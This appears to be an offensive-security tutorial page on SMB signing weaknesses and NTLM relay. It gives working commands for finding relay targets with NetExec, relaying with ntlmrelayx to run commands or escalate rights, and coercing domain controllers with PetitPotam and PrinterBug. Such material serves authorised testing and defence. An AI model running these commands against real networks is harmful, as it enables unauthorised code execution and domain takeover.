---
title: "Signing and relay: SMB message signing weaknesses and NTLM relay"
order: 2
description: "SMB signing cryptographically binds a session to its authenticated client; when signing is not required, an attacker relays a victim's NTLM authentication to another server and acts as the victim there. Combined with coercion that forces a target to authenticate, relay turns captured authentication into code execution or privilege on a second host."
keywords:
  - smb signing
  - ntlm relay
  - ntlmrelayx
  - coercion
  - petitpotam
---

# Signing and relay

SMB signing adds a message authentication code to each packet, keyed by the session, so a session cannot be hijacked or relayed. When a server does not require signing, that protection is absent, and NTLM authentication becomes relayable: an attacker who receives a victim's NTLM authentication (by coercing or capturing it) forwards that same authentication to a second server that does not require signing, completing the handshake there as the victim, without ever knowing the victim's password. The authentication is live, so the attacker then holds a session on the relayed-to host with the victim's privileges.

## Why it works, and the gates

NTLM is a challenge-response protocol with no binding to the specific server, so the messages the client computes for server A are equally valid at server B. SMB signing (and channel binding for other protocols) is what would bind them; without required signing on the destination, relay succeeds. Check signing posture first:

```bash
# which hosts do NOT require signing (relay targets)
nxc smb <subnet> --gen-relay-list relay_targets.txt     # writes hosts with signing:False
nxc smb <target>                                        # "signing:False" in the line
```

## The relay chain

```bash
# 1. set up the relay to the signing-disabled targets, asking for a shell/exec on success
impacket-ntlmrelayx -tf relay_targets.txt -smb2support
#    -c 'powershell -enc ...'   run a command on relay   | -e payload.exe
#    --escalate-user <user>     (LDAP target) grant rights | -i  interactive SMB client
# 2. drive a victim's authentication to the attacker so it can be relayed:
#    - coerce a server/DC to authenticate to the attacker (PetitPotam/PrinterBug/DFSCoerce)
#    - or capture it by poisoning name resolution (Responder) and set SMB/HTTP to OFF there
```

Two halves: the relay (`ntlmrelayx`) waits to forward authentication to the targets, and a coercion or capture technique makes a victim authenticate to the attacker. Coercion is the reliable trigger: a machine account forced to authenticate (via MS-EFSRPC/PetitPotam, the MS-RPRN PrinterBug, or DFSCoerce) relayed to LDAP can escalate, and relayed to SMB can run code on another host.

```bash
# coerce a target to authenticate to the attacker host (pairs with ntlmrelayx)
impacket-petitpotam <attacker-ip> <target-dc>
printerbug.py 'DOM/user:pass@<target>' <attacker-ip>
```

## Exploitation notes

- The destination must not require signing; domain controllers require it by default (so DCs are poor SMB-relay destinations) but ordinary servers frequently do not. The `--gen-relay-list` scan produces the target set.
- Relaying to LDAP/LDAPS on a DC enables escalation (for example granting the victim's machine account rights, or RBCD), while relaying to SMB on a server gives command execution there; choose the destination protocol by goal.
- Coercion is what makes relay reliable rather than opportunistic: forcing a privileged machine account to authenticate and relaying it is a standard path to domain escalation; the coercion techniques are domain methods that pair with this file surface.
- Cross-protocol relay (HTTP to LDAP, etc.) widens options; `ntlmrelayx` supports multiple destination protocols.

## Tools

- [Impacket ntlmrelayx](https://github.com/fortra/impacket)
- [NetExec](https://github.com/Pennyw0rth/NetExec)
- [Responder](https://github.com/lgandx/Responder)

## References

- [MS-SMB2: signing](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/)
- [Microsoft: NTLM relay and signing guidance](https://learn.microsoft.com/en-us/security/)
